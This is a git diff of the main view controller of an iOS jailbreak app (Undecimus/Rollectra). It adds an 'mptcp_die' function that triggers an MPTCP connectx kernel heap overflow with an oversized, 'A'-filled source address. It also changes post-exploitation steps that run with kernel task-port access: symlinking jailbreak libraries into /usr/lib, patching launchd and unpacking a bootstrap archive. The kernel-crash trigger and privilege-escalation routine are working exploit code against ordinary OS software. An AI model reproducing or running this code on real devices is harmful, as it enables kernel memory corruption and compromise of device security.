@@ -1,6 +1,6 @@
 //
 //  ViewController.m
-//  Rollectra
+//  Undecimus
 //
 //  Created by pwn20wnd on 8/29/18.
 //  Copyright © 2018 Pwn20wnd. All rights reserved.
@@ -17,6 +17,8 @@
 #include <libgen.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <dirent.h>
+#include <sys/sysctl.h>
 #import "ViewController.h"
 #include "common.h"
 #include "offsets.h"
@@ -766,7 +768,7 @@ int message_size_for_kalloc_size(int kalloc_size) {
     return ((3*kalloc_size)/4) - 0x74;
 }
 
-int die() {
+int vfs_die() {
     int fd = open("/", O_RDONLY);
     if (fd == -1) {
         perror("unable to open fs root\n");
@@ -788,7 +790,52 @@ int die() {
     return 0;
 }
 
-void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, char *boot_nonce)
+#define AF_MULTIPATH 39
+
+int mptcp_die() {
+    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
+    if (sock < 0) {
+        printf("socket failed\n");
+        perror("");
+        return 0;
+    }
+    printf("got socket: %d\n", sock);
+    
+    struct sockaddr* sockaddr_src = malloc(256);
+    memset(sockaddr_src, 'A', 256);
+    sockaddr_src->sa_len = 220;
+    sockaddr_src->sa_family = 'B';
+    
+    struct sockaddr* sockaddr_dst = malloc(256);
+    memset(sockaddr_dst, 'A', 256);
+    sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
+    sockaddr_dst->sa_family = AF_INET6;
+    
+    sa_endpoints_t eps = {0};
+    eps.sae_srcif = 0;
+    eps.sae_srcaddr = sockaddr_src;
+    eps.sae_srcaddrlen = 220;
+    eps.sae_dstaddr = sockaddr_dst;
+    eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
+    
+    int err = connectx(
+                       sock,
+                       &eps,
+                       SAE_ASSOCID_ANY,
+                       0,
+                       NULL,
+                       0,
+                       NULL,
+                       NULL);
+    
+    printf("err: %d\n", err);
+    
+    close(sock);
+    
+    return 0;
+}
+
+void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, const char *boot_nonce)
 {
     // Initialize variables.
     int rv = 0;
@@ -1160,6 +1207,15 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             _assert(rv == 0);
         }
         
+        if (!access("/electra", F_OK)) {
+            rv = rmdir("/electra");
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+        }
+        rv = symlink("/jb", "/electra");
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        
         rv = chdir("/jb");
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
@@ -1405,7 +1461,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
         }
-        rv = rename("/jb/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib");
+        rv = symlink("/jb/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib");
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         if (!access("/bin/launchctl", F_OK)) {
@@ -1447,7 +1503,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
         }
-        rv = rename("/jb/pspawn_hook.dylib", "/usr/lib/pspawn_hook.dylib");
+        rv = symlink("/jb/pspawn_hook.dylib", "/usr/lib/pspawn_hook.dylib");
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         LOG("Patching launchd...");
@@ -1488,7 +1544,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (access("/.installed_unc0ver", F_OK)) {
             rv = chdir("/");
             LOG("rv: " "%d" "\n", rv);
-            _assert( rv == 0);
+            _assert(rv == 0);
             rv = execCommandAndWait("/jb/tar", "-xvpkf", "/var/tmp/strap.tar", NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 512 || rv == 0);
@@ -1599,7 +1655,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
         dispatch_async(dispatch_get_main_queue(), ^{
             [self.goButton setEnabled:NO];
-            [self.goButton setTitle:NSLocalizedString(@"Exploiting...", nil) forState:UIControlStateDisabled];
+            [self.goButton setTitle:@"Exploiting..." forState:UIControlStateDisabled];
             [self.tabBarController.tabBar setUserInteractionEnabled:NO];
         });
         // Initialize kernel exploit.
@@ -1615,12 +1671,10 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
                 break;
             }
             case 2: {
-                exit(1);
                 break;
             }
                 
             default: {
-                exit(1);
                 break;
             }
         }
@@ -1628,10 +1682,10 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("Validating TFP0...");
         _assert(MACH_PORT_VALID(tfp0));
         LOG("Successfully validated TFP0.");
-        extern void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, char *boot_nonce);
-        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] boolForKey:@K_TWEAK_INJECTION], [[NSUserDefaults standardUserDefaults] boolForKey:@K_LOAD_DAEMONS], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DUMP_APTICKET], [[NSUserDefaults standardUserDefaults] boolForKey:@K_REFRESH_ICON_CACHE], strdup([[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] UTF8String]));
+        extern void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, const char *boot_nonce);
+        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] boolForKey:@K_TWEAK_INJECTION], [[NSUserDefaults standardUserDefaults] boolForKey:@K_LOAD_DAEMONS], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DUMP_APTICKET], [[NSUserDefaults standardUserDefaults] boolForKey:@K_REFRESH_ICON_CACHE], [[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] UTF8String]);
         dispatch_async(dispatch_get_main_queue(), ^{
-            [self.goButton setTitle:NSLocalizedString(@"Done, exit.", nil) forState:UIControlStateDisabled];
+            [self.goButton setTitle:@"Done, exit." forState:UIControlStateDisabled];
         });
     });
 }
@@ -1659,7 +1713,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     if (strstr(u.version, DEFAULT_VERSION_STRING)) {
         dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
             dispatch_async(dispatch_get_main_queue(), ^{
-                [self.goButton setTitle:NSLocalizedString(@"Jailbroken", nil) forState:UIControlStateDisabled];
+                [self.goButton setTitle:@"Jailbroken" forState:UIControlStateDisabled];
                 [self.goButton setEnabled:NO];
             });
         });
